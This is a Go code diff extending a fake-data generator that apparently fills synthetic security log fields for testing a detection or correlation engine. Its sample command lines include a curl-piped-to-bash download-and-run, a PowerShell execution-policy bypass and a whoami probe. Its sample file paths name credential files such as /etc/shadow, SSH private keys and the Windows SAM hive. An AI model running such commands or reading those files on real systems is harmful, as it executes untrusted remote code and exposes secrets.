@@ -59,6 +59,10 @@ func (fg *fieldGenerator) generateValueForField(field string) interface{} {
 	if containsIgnoreCase(field, "user.name") || containsIgnoreCase(field, "username") {
 		return gofakeit.Username()
 	}
+	// User IDs (UID)
+	if containsIgnoreCase(field, "user.uid") || containsIgnoreCase(field, ".uid") {
+		return gofakeit.UUID()
+	}
 	// Ports
 	if containsIgnoreCase(field, ".port") || containsIgnoreCase(field, "_port") {
 		// Return as integer for OpenSearch compatibility (correlation engine expects numeric type)
@@ -71,6 +75,65 @@ func (fg *fieldGenerator) generateValueForField(field string) interface{} {
 	// Email
 	if containsIgnoreCase(field, "email") {
 		return gofakeit.Email()
+	}
+	// Process names
+	if containsIgnoreCase(field, "process.name") {
+		processes := []string{
+			"sshd", "bash", "python3", "node", "nginx", "apache2",
+			"powershell.exe", "cmd.exe", "explorer.exe", "svchost.exe",
+			"java", "docker", "systemd", "cron",
+		}
+		return processes[rand.Intn(len(processes))]
+	}
+	// Process IDs
+	if containsIgnoreCase(field, "process.pid") || containsIgnoreCase(field, ".pid") {
+		return rand.Intn(65535) + 1
+	}
+	// Process command line
+	if containsIgnoreCase(field, "process.cmd_line") || containsIgnoreCase(field, "cmdline") {
+		cmdLines := []string{
+			"/usr/bin/python3 -m http.server 8000",
+			"/bin/bash -c 'curl http://example.com/script.sh | bash'",
+			"powershell.exe -ExecutionPolicy Bypass -File script.ps1",
+			"cmd.exe /c whoami",
+			"/usr/sbin/sshd -D",
+			"docker run -d nginx:latest",
+		}
+		return cmdLines[rand.Intn(len(cmdLines))]
+	}
+	// File paths
+	if containsIgnoreCase(field, "file.path") || containsIgnoreCase(field, ".path") {
+		paths := []string{
+			"/etc/passwd", "/etc/shadow", "/var/log/auth.log",
+			"/home/user/.ssh/id_rsa", "/tmp/malware.sh",
+			"C:\\Windows\\System32\\config\\SAM",
+			"C:\\Users\\admin\\Documents\\passwords.txt",
+			"/usr/bin/wget", "/bin/bash",
+		}
+		return paths[rand.Intn(len(paths))]
+	}
+	// File names
+	if containsIgnoreCase(field, "file.name") {
+		files := []string{
+			"malware.exe", "script.sh", "config.yaml",
+			"credentials.txt", "id_rsa", "authorized_keys",
+			"shadow", "passwd", "SAM",
+		}
+		return files[rand.Intn(len(files))]
+	}
+	// File sizes
+	if containsIgnoreCase(field, "file.size") {
+		// Return realistic file sizes (bytes)
+		return rand.Intn(10*1024*1024) + 1024 // 1KB to 10MB
+	}
+	// Device/MAC addresses
+	if containsIgnoreCase(field, ".mac") || containsIgnoreCase(field, "mac_address") {
+		return gofakeit.MacAddress()
+	}
+	// Domain names
+	if containsIgnoreCase(field, ".domain") || containsIgnoreCase(field, "user.domain") {
+		domains := []string{"CORP", "WORKGROUP", "example.com", "internal.local"}
+		return domains[rand.Intn(len(domains))]
 	}
 
 	// Default: random string
